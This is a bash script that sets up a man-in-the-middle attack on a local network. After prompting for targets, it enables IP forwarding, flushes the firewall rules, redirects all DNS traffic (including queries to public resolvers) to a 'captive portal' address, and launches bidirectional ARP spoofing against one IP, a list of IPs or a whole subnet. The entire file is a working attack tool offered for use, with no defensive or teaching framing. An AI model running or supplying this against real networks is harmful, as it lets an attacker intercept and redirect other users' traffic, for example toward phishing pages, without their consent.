#!/bin/bash

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Get network interface
read -p "Enter network interface (e.g., wlan0): " INTERFACE

# Get device IP and gateway to exempt
read -p "Enter your device IP: " DEVICE_IP
read -p "Enter gateway IP: " GATEWAY_IP
read -p "Enter captive portal IP: " PORTAL_IP

# Get target selection
echo "Select target type:"
echo "1) Single IP"
echo "2) Multiple IPs"
echo "3) Subnet"
read -p "Enter choice (1-3): " TARGET_TYPE

# Initialize targets array
declare -a TARGET_IPS

case $TARGET_TYPE in
    1)
        read -p "Enter target IP: " SINGLE_IP
        if [[ $SINGLE_IP != $DEVICE_IP && $SINGLE_IP != $GATEWAY_IP ]]; then
            TARGET_IPS+=("$SINGLE_IP")
        else
            echo "Error: Target IP cannot be device or gateway IP"
            exit 1
        fi
        ;;
    2)
        read -p "Enter target IPs (space-separated): " -a MULTI_IPS
        for IP in "${MULTI_IPS[@]}"; do
            if [[ $IP != $DEVICE_IP && $IP != $GATEWAY_IP ]]; then
                TARGET_IPS+=("$IP")
            else
                echo "Warning: Skipping $IP (matches device or gateway IP)"
            fi
        done
        ;;
    3)
        read -p "Enter subnet (e.g., 192.168.1.0/24): " SUBNET
        # Use ipcalc to generate IPs
        IPS=$(ipcalc $SUBNET | grep '^Host' | awk '{print $2}')
        for IP in $IPS; do
            if [[ $IP != $DEVICE_IP && $IP != $GATEWAY_IP ]]; then
                TARGET_IPS+=("$IP")
            fi
        done
        ;;
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

# Flush existing iptables rules
iptables -F
iptables -t nat -F

# Redirect DNS traffic (UDP and TCP) to captive portal
iptables -t nat -A PREROUTING -i $INTERFACE -p udp --dport 53 -j DNAT --to-destination $PORTAL_IP
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 53 -j DNAT --to-destination $PORTAL_IP

# Redirect common public DNS servers
for DNS in 8.8.8.8 8.8.4.4 1.1.1.1 1.0.0.1; do
    iptables -t nat -A PREROUTING -i $INTERFACE -p udp -d $DNS --dport 53 -j DNAT --to-destination $PORTAL_IP
done

# Allow access to the captive portal
iptables -t nat -A PREROUTING -i $INTERFACE -d $PORTAL_IP -j ACCEPT

# Exempt device and gateway IPs
iptables -t nat -A PREROUTING -i $INTERFACE -s $DEVICE_IP -j ACCEPT
iptables -t nat -A PREROUTING -i $INTERFACE -d $DEVICE_IP -j ACCEPT
iptables -t nat -A PREROUTING -i $INTERFACE -s $GATEWAY_IP -j ACCEPT
iptables -t nat -A PREROUTING -i $INTERFACE -d $GATEWAY_IP -j ACCEPT

# Masquerade outgoing traffic
iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE

# Start ARP spoofing for each target IP
for TARGET_IP in "${TARGET_IPS[@]}"; do
    arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP &
    arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP &
done

echo "Captive portal setup complete. Press Ctrl+C to stop ARP spoofing."
wait
